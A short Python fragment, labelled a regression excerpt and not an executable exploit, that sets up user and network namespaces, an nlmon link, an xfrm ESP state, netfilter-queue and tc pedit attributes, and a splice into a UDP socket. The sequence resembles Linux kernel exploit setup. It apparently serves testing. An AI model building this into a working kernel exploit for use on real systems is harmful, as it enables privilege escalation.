# Source-shape regression excerpt, not an executable exploit.
import os
import struct
import subprocess
NFQNL_COPY_PACKET = 2
TCA_PEDIT_PARMS = 2
os.unshare(os.CLONE_NEWUSER | os.CLONE_NEWNET)
subprocess.run(["ip", "link", "add", "monitor7", "type", "nlmon"], check=True)
subprocess.run(["ip", "xfrm", "state", "add", "src", "127.0.0.1",
                "dst", "127.0.0.1", "proto", "esp", "spi", "256"], check=True)
queue_config = struct.pack("!IB", 65535, NFQNL_COPY_PACKET)
edit_attr = struct.pack("HH", 24, TCA_PEDIT_PARMS)
os.splice(read_pipe, udp_socket, 64)
